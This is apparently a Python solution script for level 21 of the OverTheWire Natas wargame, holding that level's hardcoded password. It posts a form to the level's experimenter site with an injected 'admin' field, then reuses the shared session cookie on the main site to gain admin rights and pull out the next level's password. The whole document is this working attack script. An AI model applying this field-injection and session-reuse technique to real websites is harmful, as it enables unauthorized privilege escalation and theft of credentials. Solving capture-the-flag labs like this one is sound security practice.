import requests
import re

username = "natas21"
password = "IFekPyrQXftziDEsUr3x21sYuahypdgJ"
url1 = "http://%s.natas.labs.overthewire.org/"  % username
url2 = "http://%s-experimenter.natas.labs.overthewire.org/"  % username

session = requests.Session()

response1 = session.get(url1,auth=(username,password))
print(response1.text)
print("="*50)

source = "index-source.html"
response1 = session.get(url1+source,auth=(username,password))
print(response1.text)
print("="*50)

response2 = session.get(url2,auth=(username,password))
print(response2.text)
print("="*50)

response2 = session.get(url2+source,auth=(username,password))
print(response2.text)
print("="*50)

session.cookies.clear() # clear cookies
response2 = session.post(url2,auth=(username,password),data={"align":"left","fontsize":"50%","bgcolor":"green","admin":"1","submit":"Update"})

cookies = {"PHPSESSID":session.cookies["PHPSESSID"]} 
response1 = session.get(url1,auth=(username,password),cookies=cookies)
print("\nThe password for the next level is: " + re.findall("Password: (.*)</pre>",response1.text)[0])